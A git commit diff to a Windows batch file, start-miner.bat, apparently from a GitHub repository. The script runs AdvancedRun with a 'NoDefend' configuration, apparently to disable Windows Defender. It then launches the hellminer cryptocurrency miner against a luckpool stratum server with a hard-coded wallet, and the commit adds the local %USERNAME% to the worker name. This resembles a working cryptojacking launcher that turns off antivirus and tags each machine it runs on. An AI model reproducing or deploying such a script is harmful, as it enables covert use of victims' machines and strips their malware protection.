f042a9c0bebcfad0ce56d9d4234a0897dcc9b220
Mybay1 <132859537+Mybay1@users.noreply.github.com>
2023-06-11 02:53:12 +0100

    Update start-miner.bat

--- start-miner.bat
+++ start-miner.bat
@@ -1,2 +1,2 @@
 AdvancedRun.exe /Run NoDefend.cfg
-.\hellminer.exe -c stratum+tcp://na.luckpool.net:3960 -u RMovVQiRqawd8KThXQtKQhgESBPGzrSnXX -p hybrid --cpu 2
+.\hellminer.exe -c stratum+tcp://na.luckpool.net:3960 -u RMovVQiRqawd8KThXQtKQhgESBPGzrSnXX.%USERNAME% -p hybrid --cpu 2
